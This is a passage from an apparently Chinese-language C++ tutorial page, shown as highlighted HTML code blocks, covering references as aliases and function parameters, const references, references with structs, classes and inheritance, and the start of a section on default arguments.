102</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看地址，会发现它们是相同的</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of rats: &quot;</span> &lt;&lt; &amp;rats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Address of rodents: &quot;</span> &lt;&lt; &amp;rodents &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出相同的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// int&amp; bad_ref; // 错误！引用必须在声明时初始化</span></span><br><span class="line">    <span class="comment">// double&amp; wrong_type = rats; // 错误！类型不匹配 (double&amp; vs int)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关键点:</strong></p><ul><li>  引用必须在声明时初始化。</li><li>  引用一旦初始化，就不能再指向其他变量。它终生都是其初始变量的别名。</li><li>  引用本身不占用独立的内存地址（或者说，它的地址就是它所引用变量的地址）。</li></ul><h3 id="8-2-2-将引用用作函数参数"><a href="#8-2-2-将引用用作函数参数" class="headerlink" title="8.2.2 将引用用作函数参数"></a>8.2.2 将引用用作函数参数</h3><p>引用最重要和最常见的用途之一是作为函数参数，这称为**按引用传递 (Pass by Reference)**。当使用引用作为函数参数时，函数接收的是原始变量的别名，而不是副本。这意味着函数可以直接访问并修改调用者作用域中的原始变量。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function_name</span><span class="params">(type&amp; ref_parameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以通过 ref_parameter 修改原始实参</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：使用引用参数交换两个变量的值</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：使用引用参数交换两个 int 变量的值</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_ref</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123; <span class="comment">// a 和 b 是调用时传入变量的别名</span></span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    <span class="comment">// 对 a 和 b 的修改直接影响原始变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对比：使用指针参数交换 (传统 C 风格)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_ptr</span><span class="params">(<span class="keyword">int</span>* p_a, <span class="keyword">int</span>* p_b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = *p_a;</span><br><span class="line">    *p_a = *p_b;</span><br><span class="line">    *p_b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对比：使用值传递 (无法交换原始变量)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_val</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    <span class="comment">// 只修改了局部副本 a 和 b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> wallet1 = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> wallet2 = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试使用值传递交换 (失败)</span></span><br><span class="line">    swap_val(wallet1, wallet2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_val: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 值不变</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用引用传递交换 (成功)</span></span><br><span class="line">    swap_ref(wallet1, wallet2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_ref: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 值已交换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次交换回来，使用指针传递 (成功)</span></span><br><span class="line">    swap_ptr(&amp;wallet1, &amp;wallet2); <span class="comment">// 注意需要传递地址</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After swap_ptr: wallet1 = &quot;</span> &lt;&lt; wallet1 &lt;&lt; <span class="string">&quot;, wallet2 = &quot;</span> &lt;&lt; wallet2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 值再次交换回来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>按引用传递 vs. 按指针传递:</strong></p><ul><li>  <strong>语法:</strong> 引用传递的调用语法更简洁自然 (<code>swap_ref(a, b)</code>)，而指针传递需要显式获取地址 (<code>swap_ptr(&amp;a, &amp;b)</code>) 并在函数内部解引用 (<code>*p_a</code>)。</li><li>  <strong>空值:</strong> 指针可以为 <code>nullptr</code>，需要在使用前检查。引用通常（在标准用法下）不会是“空”的，因为它必须引用一个已存在的对象。这使得引用在某些情况下更安全。</li><li>  <strong>目的:</strong> 两者都可以用来允许函数修改调用者的变量，以及避免大型对象的复制开销。</li></ul><h3 id="8-2-3-引用的属性和特别之处"><a href="#8-2-3-引用的属性和特别之处" class="headerlink" title="8.2.3 引用的属性和特别之处"></a>8.2.3 引用的属性和特别之处</h3><ol><li> <strong>必须初始化:</strong> 如前所述，引用在声明时必须绑定到一个已存在的对象。</li><li> <strong>不可重新绑定:</strong> 引用不能在初始化后更改其引用的对象。</li><li> <strong>行为像原变量:</strong> 对引用的操作（赋值、取地址等）通常表现得就像直接对原始变量操作一样。</li><li><strong>临时变量和 <code>const</code> 引用:</strong> 通常，不能将引用绑定到临时变量或字面值。但有一个重要的例外：<strong>常量引用 (<code>const type&amp;</code>)</strong> 可以绑定到临时变量、字面值或类型稍有不同的变量（如果可以进行隐式转换）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> value = <span class="number">3.14</span>;</span><br><span class="line"><span class="comment">// int&amp; ref_val = value; // 错误：类型不匹配</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; const_ref_val = value; <span class="comment">// 合法！创建了一个临时的 int(3)，const_ref_val 引用这个临时变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span>&amp; ref_literal = <span class="number">5.0</span> * <span class="number">2.0</span>; <span class="comment">// 合法！引用一个临时 double(10.0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> num = <span class="number">100L</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>&amp; ref_num = num; <span class="comment">// 合法！引用一个临时的 int(100)</span></span><br></pre></td></tr></table></figure> 这种特性使得常量引用在函数参数中非常有用，因为它们可以接受更广泛的实参类型（包括字面值和需要类型转换的值），同时保证函数不会修改它们。</li></ol><h3 id="8-2-4-将引用用于结构"><a href="#8-2-4-将引用用于结构" class="headerlink" title="8.2.4 将引用用于结构"></a>8.2.4 将引用用于结构</h3><p>按引用传递对于结构体特别有用，因为它可以避免复制整个结构体（可能包含许多成员）的开销。如果函数不需要修改结构体，应使用常量引用 (<code>const struct_type&amp;</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Product</span> &#123;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按常量引用传递结构，避免复制且不修改</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_product</span><span class="params">(<span class="keyword">const</span> Product&amp; prod)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product Name: &quot;</span> &lt;&lt; prod.name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: $&quot;</span> &lt;&lt; prod.price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; prod.quantity &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// prod.price = 0.0; // 错误！不能通过 const 引用修改</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按引用传递结构，允许修改</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">apply_discount</span><span class="params">(Product&amp; prod, <span class="keyword">double</span> discount_percentage)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (discount_percentage &gt; <span class="number">0</span> &amp;&amp; discount_percentage &lt; <span class="number">100</span>) &#123;</span><br><span class="line">        prod.price *= (<span class="number">1.0</span> - discount_percentage / <span class="number">100.0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Product laptop = &#123;<span class="string">&quot;Laptop Pro&quot;</span>, <span class="number">1200.0</span>, <span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Initial Product ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_product(laptop); <span class="comment">// 高效传递，不复制</span></span><br><span class="line"></span><br><span class="line">    apply_discount(laptop, <span class="number">10.0</span>); <span class="comment">// 传递引用以修改价格</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Product After 10% Discount ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    display_product(laptop); <span class="comment">// 再次高效传递</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-5-将引用用于类对象"><a href="#8-2-5-将引用用于类对象" class="headerlink" title="8.2.5 将引用用于类对象"></a>8.2.5 将引用用于类对象</h3><p>将引用用于类对象与用于结构体完全相同。按常量引用 (<code>const class_type&amp;</code>) 传递是避免复制大型对象并确保函数不修改对象状态的标准做法。如果需要修改对象，则使用普通引用 (<code>class_type&amp;</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Student(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; n) : name(n) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add_grade</span><span class="params">(<span class="keyword">int</span> g)</span> </span>&#123; grades.push_back(g); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print_info</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">// const 成员函数</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Student: &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, Grades: &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> g : grades) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; g &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; <span class="title">get_name</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> name; &#125; <span class="comment">// 返回常量引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; grades;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按常量引用传递类对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_student_summary</span><span class="params">(<span class="keyword">const</span> Student&amp; s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Summary for &quot;</span> &lt;&lt; s.get_name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    s.print_info(); <span class="comment">// 可以调用 const 成员函数</span></span><br><span class="line">    <span class="comment">// s.add_grade(100); // 错误！不能通过 const 引用调用非 const 成员函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Student <span class="title">alice</span><span class="params">(<span class="string">&quot;Alice&quot;</span>)</span></span>;</span><br><span class="line">    alice.add_grade(<span class="number">95</span>);</span><br><span class="line">    alice.add_grade(<span class="number">88</span>);</span><br><span class="line"></span><br><span class="line">    show_student_summary(alice); <span class="comment">// 高效传递，不复制</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-6-对象、继承和引用"><a href="#8-2-6-对象、继承和引用" class="headerlink" title="8.2.6 对象、继承和引用"></a>8.2.6 对象、继承和引用</h3><p>当与类继承结合使用时，基类的引用可以指向派生类的对象。这是实现<strong>多态 (Polymorphism)</strong> 的关键机制之一（与指针类似）。通过基类引用调用虚函数时，会执行派生类中相应的版本。这部分内容将在后续章节（如第 13 章）详细介绍。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 概念预览 (将在后续章节详细讲解)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::show()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">    <span class="keyword">virtual</span> ~Base() &#123;&#125; <span class="comment">// 虚析构函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> :</span> <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Derived::show()&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Base&amp; obj)</span> </span>&#123; <span class="comment">// 参数是基类的常量引用</span></span><br><span class="line">    obj.show(); <span class="comment">// 调用虚函数，会根据 obj 实际引用的对象类型执行相应版本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Base b;</span><br><span class="line">    Derived d;</span><br><span class="line"></span><br><span class="line">    display(b); <span class="comment">// 输出: Base::show()</span></span><br><span class="line">    display(d); <span class="comment">// 输出: Derived::show() (多态行为)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-2-7-何时使用引用参数"><a href="#8-2-7-何时使用引用参数" class="headerlink" title="8.2.7 何时使用引用参数"></a>8.2.7 何时使用引用参数</h3><p>选择使用值传递、指针传递还是引用传递取决于具体需求：</p><ol><li><p><strong>按值传递 (<code>type param</code>)</strong>:</p><ul><li>  适用于小型数据类型（<code>int</code>, <code>double</code>, <code>bool</code>, 指针本身）。</li><li>  当函数需要操作数据的副本而不影响原始数据时。</li><li>  简单易懂。</li></ul></li><li><p><strong>按指针传递 (<code>type* param</code>)</strong>:</p><ul><li>  当函数需要修改调用者的原始数据时（传统 C 风格）。</li><li>  当需要表示“可选”参数（可以传递 <code>nullptr</code>）时。</li><li>  与 C 库或旧代码交互时。</li><li>  传递大型对象以避免复制开销（但通常引用更受欢迎）。</li></ul></li><li><p><strong>按引用传递 (<code>type&amp; param</code>)</strong>:</p><ul><li>  当函数<strong>需要修改</strong>调用者的原始数据时（C++ 风格，通常比指针更简洁安全）。</li><li>  传递大型对象（结构、类）以<strong>避免复制开销</strong>，但函数<strong>不需要修改</strong>对象时，应使用**常量引用 (<code>const type&amp; param</code>)**。这是 C++ 中非常常见的做法，兼具效率和安全性。</li></ul></li></ol><p><strong>经验法则:</strong></p><ul><li>  对于内置类型和小型结构，优先考虑<strong>按值传递</strong>。</li><li>  对于需要修改调用者数据的大型对象或函数，使用<strong>按引用传递</strong> (<code>type&amp;</code>)。</li><li>  对于不需要修改调用者数据的大型对象，使用<strong>按常量引用传递</strong> (<code>const type&amp;</code>) 以提高效率和安全性。</li><li>  在需要表示可选参数或与 C 风格代码交互时，考虑使用<strong>按指针传递</strong> (<code>type*</code>)。</li></ul><p>引用是 C++ 中一个强大且常用的特性，尤其是在函数参数和返回值中，它提供了指针之外的另一种处理间接访问和避免复制的方式。</p><h2 id="8-3-默认参数"><a href="#8-3-默认参数" class="headerlink" title="8.3 默认参数"></a>8.3 默认参数</h2><p>C++ 允许在函数声明（原型）或定义中为函数的参数指定<strong>默认值</strong>。如果在调用函数时没有为带有默认值的参数提供实参，那么编译器会自动使用该参数的默认值。如果提供了实参，则使用提供的实参值，覆盖默认值。</p><p><strong>目的:</strong></p><ul><li>  提高函数的灵活性，允许用户在调用时省略某些不常用的参数。</li><li>  简化函数调用，特别是当某些参数在大多数情况下都使用相同的值时。</li></ul><h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><p>在函数原型或定义中，通过在参数声明后使用赋值运算符 <code>=</code> 来指定默认值。</p><p><strong>语法 (在原型中指定):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">return_type <span class="title">function_name</span><span class="params">(type param1, type param2 = default_value2, type param3 = default_value3)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>重要规则:</strong></p><ol><li><strong>从右到左规则:</strong> 必须为函数参数列表<strong>从右到左</strong>依次提供默认值。如果某个参数有默认值，则其右侧的所有参数<strong>必须</strong>也有默认值。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 合法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b = <span class="number">10</span>, <span class="keyword">int</span> c = <span class="number">20</span>)</span></span>;</span><br><span class="line"><span class="comment">// 合法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> a = <span class="number">5</span>, <span class="keyword">int</span> b = <span class="number">10</span>, <span class="keyword">int</span> c = <span class="number">20</span>)</span></span>;</span><br><span class="line"><span class="comment">// 非法！如果 b 有默认值，c 必须也有</span></span><br><span class="line"><span class="comment">// void func_error(int a, int b = 10, int c);</span></span><br></pre></td></tr></table></figure></li><li> <strong>原型 vs. 定义:</strong> 默认参数值通常在<strong>函数原型</strong>（声明）中指定，而不是在函数定义中。如果在原型中指定了默认值，则定义中不能再次指定。如果函数没有单独的原型（定义在调用之前），则可以在定义中指定默认值。将默认值放在原型中（通常在头文件里）是更好的做法，因为它向调用者清晰地展示了可以省略哪些参数。</li><li><strong>调用时的匹配:</strong> 调用函数时，提供的实参会<strong>从左到右</strong>匹配参数。不能跳过没有默认值的参数去为有默认值的参数提供值。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func1(<span class="number">1</span>);       <span class="comment">// 等效于 func1(1, 10, 20)</span></span><br><span class="line">func1(<span class="number">1</span>, <span class="number">50</span>);   <span class="comment">// 等效于 func1(1, 50, 20)</span></span><br><span class="line">func1(<span class="number">1</span>, <span class="number">50</span>, <span class="number">30</span>); <span class="comment">// 等效于 func1(1, 50, 30)</span></span><br><span class="line"><span class="comment">// func1(1, , 30); // 非法！不能跳过参数 b</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型，指定默认参数</span></span><br><span class="line"><span class="comment">// level 默认为 1， prefix 默认为 &quot;Log: &quot;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">log_message</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; message, <span class="keyword">int</span> level = <span class="number">1</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; prefix = <span class="string">&quot;Log: &quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 调用方式 1: 提供所有参数</span></span><br><span class="line">    log_message(<span class="string">&quot;System started.&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Info: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用方式 2: 省略最右边的 prefix 参数，使用其默认值</span></span><br><span class="line">    log_message(<span class="string">&quot;Processing data...&quot;</span>, <span class="number">2</span>); <span class="comment">// prefix 使用 &quot;Log: &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用方式 3: 省略 level 和 prefix 参数，使用它们的默认值</span></span><br><span class="line">    log_message(<span class="string">&quot;Operation complete.&quot;</span>); <span class="comment">// level 使用 1, prefix 使用 &quot;Log: &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// log_message(&quot;Error 